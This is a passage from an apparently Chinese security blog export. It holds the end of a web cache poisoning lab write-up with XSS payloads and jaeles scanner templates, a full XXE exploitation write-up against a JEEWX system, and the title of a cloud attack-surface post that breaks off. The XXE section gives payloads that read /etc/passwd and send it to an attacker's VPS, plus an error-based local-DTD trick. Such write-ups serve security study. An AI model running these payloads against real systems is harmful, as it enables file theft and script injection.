<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/resources/json/geolocate.json&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span>():</span></span><br><span class="line">    t = &#123;</span><br><span class="line">        <span class="string">&#x27;country&#x27;</span>: <span class="string">&#x27;&lt;img src=a onerror=alert(document.domain)&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(t), <span class="number">200</span>, [(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">4445</span>)</span><br></pre></td></tr></table></figure>





<h3 id="3-8-畸形请求导致投毒"><a href="#3-8-畸形请求导致投毒" class="headerlink" title="3.8 畸形请求导致投毒"></a>3.8 畸形请求导致投毒</h3><p>本实验是通过不规范的HTTP请求导致的投毒攻击，首先查看主页，其中callback函数是需要注意的问题，</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222141653763.png" alt="image-20210222141653763"></p>
<p>单独访问<code>js/geolocate.js?callback=setCountryCookie</code>，修改callback的值，返回内容也会改变。但是callback的值是cache key。没有办法利用。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142043129.png" alt="image-20210222142043129"></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142632400.png" alt="image-20210222142632400"></p>
<p>返回内容如下，</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const setCountryCookie = <span class="function"><span class="params">(country)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;country=&#x27;</span> + country; &#125;;</span><br><span class="line">const setLangCookie = <span class="function"><span class="params">(lang)</span> =&gt;</span> &#123; <span class="built_in">document</span>.cookie = <span class="string">&#x27;lang=&#x27;</span> + lang; &#125;;</span><br><span class="line">setCountryCookie(&#123;<span class="string">&quot;country&quot;</span>:<span class="string">&quot;United Kingdom&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>



<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;/js/geolocate.js?callback=setCountryCookie&quot;&gt;&lt;/script&gt;</code></p>
<p>会拿回: <code>setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);</code></p>
<p>最终成为:</p>
<p><code>&lt;script type=&quot;text/javascript&quot;&gt;setCountryCookie(&#123;&quot;country&quot;:&quot;United Kingdom&quot;&#125;);&lt;/script&gt;</code></p>
<p>但是如果不放弃，深入测试就会发现。虽然在get请求是cache key，但是在post里添加相同的参数却是unkeyed。构造payload: <code>callback=alert(1)</code>，重复请求直到命中缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222145309155.png" alt="image-20210222145309155"></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222144410773.png" alt="image-20210222144410773"></p>
<h3 id="3-9-通过url参数投毒"><a href="#3-9-通过url参数投毒" class="headerlink" title="3.9 通过url参数投毒"></a>3.9 通过url参数投毒</h3><p>本实验中url参数是unkeyed。编写一个get请求的插件，随意添加几个参数，如果添加的参数值回显在响应中，那么就手工测试是否能够进一步利用。</p>
<p>jaeles插件代码如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-add-getquery-reflect</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">low</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">vars:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      test</span></span><br><span class="line"><span class="string">      utm%5fcontent</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      url</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">check:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      saddgetqueryreflect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">redirect:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">headers:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="number">10.15</span><span class="string">;</span> <span class="string">rv:85.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/85.0</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/?&#123;&#123;.vars&#125;&#125;=&#123;&#123;.check&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    </span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;saddgetqueryreflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>插件逻辑很简单，就是在URL后面跟几个参数，看看参数的值是否会出现在response中。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100506511.png" alt="image-20210204100506511"></p>
<p>通过插件确实能检测到，现在我们手工验证一下，确实有回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100805897.png" alt="image-20210204100805897"></p>
<p>接下来将unkeyed参数注入到缓存，然后去掉unkeyed参数，检测是否还能收到带有unkey参数的响应。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204105734286.png" alt="image-20210204105734286"></p>
<p>去掉之后任然收到了带有unkey参数的响应，那么接下来就是如何来恶意利用。</p>
<p>首先还是来进行xss payload注入。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110117141.png" alt="image-20210204110117141"></p>
<p>访问会自动加上xss payload</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110226548.png" alt="image-20210204110226548"></p>
<h3 id="3-10-利用缓存绕过编码限制-URL-normalization"><a href="#3-10-利用缓存绕过编码限制-URL-normalization" class="headerlink" title="3.10 利用缓存绕过编码限制(URL normalization)"></a>3.10 利用缓存绕过编码限制(<strong>URL normalization</strong>)</h3><p>用一个检查路径回显的插件检测到了路径回显问题，插件如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">path-reflect</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">path</span> <span class="string">reflect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(6)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.BaseURL&#125;&#125;</span>&#x27;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;/&#123;&#123;.ran&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StringSearch(&quot;response&quot;, &quot;&#123;&#123;.ran&#125;&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>手工探测也发现了该问题，</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111457635.png" alt="image-20210207111457635"></p>
<p>既然有回显，肯定试一下XSS攻击。插入payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现返回结果是编码后的结果。多次请求，命中缓存还是编码后的结果。由于发送请求时候浏览器会自动加一层URL编码</p>
<p>是没办法直接进行XSS攻击的。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111614903.png" alt="image-20210207111614903"></p>
<p>转换一下思路，存在缓存，那如果我们把为未编码的payload插入缓存，那么我们请求缓存未编码的payload。就能触发payload。</p>
<ol>
<li><p>通过BurpSuite将未编码的 payload注入缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131145356.png" alt="image-20210207131145356"></p>
</li>
</ol>
<p>2 . 再在浏览器中请求地址，成功触发payload。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131104220.png" alt="image-20210207131104220"></p>
<h3 id="3-11-内部缓存中毒"><a href="#3-11-内部缓存中毒" class="headerlink" title="3.11 内部缓存中毒"></a>3.11 内部缓存中毒</h3><p>打开实验环境，通过拦截数据包，发现似乎没有缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090500297.png" alt="image-20210216090500297"></p>
<p>通过之前编写的插件检测，发现参数污染 x-forwarded-host头等回显问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090542129.png" alt="image-20210216090542129"></p>
<p>本例中我们显然要找到缓存的地方才行。通过添加x-forwarded-host头。X-Forwarded-Host: your-exploit-server</p>
<p>在自己的服务器上观察收到的请求，发现有三处请求，并且响应包中也有三处回显，其中geolocate.js的请求在我们删除X-Forwarded-Host头后还是会请求，说明这种是缓存在内部，我们通过在自己的服务器上构造利用payload，就可以利用该漏洞。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216091300459.png" alt="image-20210216091300459"></p>
<h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4. 防御"></a>4. 防御</h2><ul>
<li><p>终极方案就是关闭缓存，但对很多网站来说并不现实，实际可能需要变通。比如你使用缓存仅仅是因为CDN默认就是开着的，这时候可以考虑是否真的需要这个功能。</p>
</li>
<li><p>就算是真的需要使用缓存，也要限制在静态资源上，在后端服务器做好检测，避免将恶意内容返回给缓存。</p>
</li>
<li><p>如果使用外部供应商的缓存，不仅要修改默认配置，还要查看CDN支持那些请求头，因为很多web缓存投毒攻击都是出现在一些不常用的请求头上。</p>
</li>
</ul>
<p>在使用缓存时，你应该采用如下的一些防御方案</p>
<ul>
<li>如果出于性能考虑不使用某些缓存键，就重写请求，不要直接配置，这样很容易导致unkeyed。</li>
<li>不要接受畸形HTTP请求，使用的某些外部供应商的技术可能默认支持各种不规范的HTTP请求。</li>
<li>不要忽视客户端漏洞，因为客户端漏洞结合缓存会变成威力巨大的漏洞。</li>
</ul>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
<li> black hat议题白皮书：<a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning-wp.pdf</a></li>
<li> black hat议题ppt:<a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Kettle-Web-Cache-Entanglement-Novel-Pathways-To-Poisoning.pdf</a></li>
<li> <a href="https://portswigger.net/research/practical-web-cache-poisoning">https://portswigger.net/research/practical-web-cache-poisoning</a></li>
<li> <a href="https://ph4ntonn.github.io/Web-Cache-Poisoning.html">https://ph4ntonn.github.io/Web-Cache-Poisoning.html</a></li>
<li> <a href="https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58">https://medium.com/@m01e/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%89%88-4e5a1cfd2c58</a></li>
<li> <a href="https://www.4hou.com/posts/RwoL">https://www.4hou.com/posts/RwoL</a></li>
<li> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ</a></li>
<li> <a href="https://segmentfault.com/a/1190000009638800">https://segmentfault.com/a/1190000009638800</a></li>
<li> <a href="https://segmentfault.com/a/1190000021060741">https://segmentfault.com/a/1190000021060741</a></li>
<li> <a href="https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning">https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning</a></li>
<li> <a href="https://cpdos.org/">https://cpdos.org/</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>一次Java系统的报错型XXE漏洞利用</title>
    <url>/%E4%B8%80%E6%AC%A1Java%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8A%A5%E9%94%99%E5%9E%8BXXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>当我们发现一个XXE的时候，支持外部实体，但是服务端无回显。在这种情况，你有两种选择：<strong>error-based</strong> 或者 <strong>out-of-band</strong> 。</p>
<span id="more"></span>



<p>访问发现是JEEWX系统，使用admin/123456登录。</p>
<p>点击微信配置——&gt;公众号测试</p>
<p>发现如下数据包，看起来存在xxe漏洞，支持外部实体。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wechatController.do?wechat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxxxxxxx:50636</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0xxxxxx</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>270</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://xxxxxxxx:50636</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ip:50636/commonweixin/back/myJwWebJwid/list.do</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=2AA6D309ADC8925576F35xxxxxxxx</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ToUserName</span>&gt;</span>test<span class="tag">&lt;/<span class="name">ToUserName</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">FromUserName</span>&gt;</span>test<span class="tag">&lt;/<span class="name">FromUserName</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">CreateTime</span>&gt;</span>test<span class="tag">&lt;/<span class="name">CreateTime</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">MsgType</span>&gt;</span>test<span class="tag">&lt;/<span class="name">MsgType</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">Content</span>&gt;</span>test<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>查看响应包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 22 Nov 2022 10:27:27 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="crmsh">&#123;<span class="attr">msg=</span><span class="keyword">xml</span> <span class="title">parse</span> success,no error&#125;</span></span><br></pre></td></tr></table></figure>

<p>确定没有回显点，尝试用XXE盲打。</p>
<h2 id="XXE-out-of-band"><a href="#XXE-out-of-band" class="headerlink" title="XXE out-of-band"></a>XXE out-of-band</h2><p>aa.dtd（vps)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps-ip:port/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>payload</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="meta"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps-ip:port/aa.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="xml"></span></span><span class="perl">%remote;</span><span class="xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="xml"></span></span><span class="perl">%all;</span><span class="xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="xml"></span></span><span class="perl">%send;</span><span class="xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>返回结果如下，如果java版本java1.7+，不能直接使用file:///    </p>
<p> 参考：</p>
<p> <a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a>  </p>
<p><a href="https://lalajun.github.io/2019/12/03/WEB-XXE/#%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87">https://lalajun.github.io/2019/12/03/WEB-XXE/#%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87</a></p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/33.jpg"></p>
<p>我们将aa.dtd改动一下，使用不存在的一个文件，看有什么报错</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etxxxxxxxxxxx&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps-ip:port/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再次请求，返回如下报错</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">&#123;msg=xml <span class="keyword">parse</span> <span class="keyword">error</span>, <span class="keyword">error</span>=org.dom4j.DocumentException: /etxxxxxxxxxxx (<span class="keyword">No</span> such <span class="keyword">file</span> or directory) Nested exception: /etxxxxxxxxxxx (<span class="keyword">No</span> such <span class="keyword">file</span> or directory)&#125;</span><br></pre></td></tr></table></figure>

<p>说明是存在xxe漏洞的，没有找到这个不存在的文件。</p>
<p><strong>如果是php的题目我们可以用php封装器绕过对file协议的检测</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http:/ip:port/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>但是这里可以判断是java的，我们可以用url协议和，jar协议，在服务端重新部署</p>
<ul>
<li><p>url</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:////flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;url://vps-ip:port/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>jar</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:////flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;jar://vps-ip:port/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>再次请求</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/34.jpg"></p>
<h2 id="本地DTD方式利用XXE"><a href="#本地DTD方式利用XXE" class="headerlink" title="本地DTD方式利用XXE"></a>本地DTD方式利用XXE</h2><p>在图文素材的文件上传处，上传文件获取到绝对路径</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;success&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;文件上传成功&quot;</span>,<span class="attr">&quot;obj&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;attributes&quot;</span>:&#123;<span class="attr">&quot;savePath&quot;</span>:<span class="string">&quot;/jeewx-data/1c53c34494674865b5e947db1a8de74d.png&quot;</span>,<span class="attr">&quot;fileKey&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;url&quot;</span>:<span class="string">&quot;/imgs/back/1c53c34494674865b5e947db1a8de74d.png&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>根据这篇文章：<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
<p>我们可以上传一个dtd文档，但是这里只支持图片格式，我们后缀就用png，试一试。</p>
<p>上传的dtd文件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">pattern</span> (%<span class="meta-keyword">condition</span>;)&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理是：This works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/35.jpg"></p>
<p>payload</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span></span><br><span class="line"><span class="meta"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///jeewx-data/950e68c86579486ab5891fc49d23d244.png&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="xml"></span></span></span><br><span class="line"><span class="meta"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">&#x27;aaa)&gt;</span></span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta"><span class="xml">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta"><span class="xml">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta"><span class="xml">        &amp;#x25;eval;</span></span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta"><span class="xml">        &amp;#x25;error;</span></span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta"><span class="xml">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="xml"></span></span><span class="perl"></span></span><br><span class="line"><span class="perl">    %local_dtd;</span><span class="xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/%E6%89%93%E9%9D%B6/36.jpg"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p> <a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a>  </p>
</li>
<li><p><a href="https://lalajun.github.io/2019/12/03/WEB-XXE/#%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87">https://lalajun.github.io/2019/12/03/WEB-XXE/#%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87</a></p>
</li>
<li><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云原生攻击面</title>
    <url>/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
    <content><![CDATA[<blockquote>
<p>一切有为法，如梦幻泡影，如露亦如电，应作如是观。</p>
</blockquote>
<p>对云原生的攻击面做个归纳</p>
<span id="more"></span>



<p>攻击面如下：</p>
